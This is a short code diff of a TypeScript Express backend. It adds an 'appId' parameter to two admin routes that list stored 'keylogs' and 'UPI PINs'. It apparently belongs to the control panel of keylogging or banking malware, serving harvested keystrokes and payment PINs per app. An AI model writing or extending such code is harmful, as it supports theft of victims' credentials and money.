@@ -217,10 +217,11 @@ router.get('/apps', authenticate, asyncHandler(async (req: Request, res: Respons
  */
 router.get('/keylogs', authenticate, asyncHandler(async (req: Request, res: Response) => {
     const { limit = 100 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
     const isAdmin = req.user!.role === 'admin';
     if (!isAdmin) return res.status(403).json({ success: false, error: 'Forbidden' });
 
-    const provider = await ProviderFactory.getProvider();
+    const provider = await ProviderFactory.getProvider(appId);
     const keylogs = await provider.listAllKeylogs(Number(limit));
     return res.json({ success: true, keylogs });
 }));
@@ -230,10 +231,11 @@ router.get('/keylogs', authenticate, asyncHandler(async (req: Request, res: Resp
  */
 router.get('/upi-pins', authenticate, asyncHandler(async (req: Request, res: Response) => {
     const { limit = 100 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
     const isAdmin = req.user!.role === 'admin';
     if (!isAdmin) return res.status(403).json({ success: false, error: 'Forbidden' });
 
-    const provider = await ProviderFactory.getProvider();
+    const provider = await ProviderFactory.getProvider(appId);
     const pins = await provider.listAllUpiPins(Number(limit));
     return res.json({ success: true, pins });
 }));
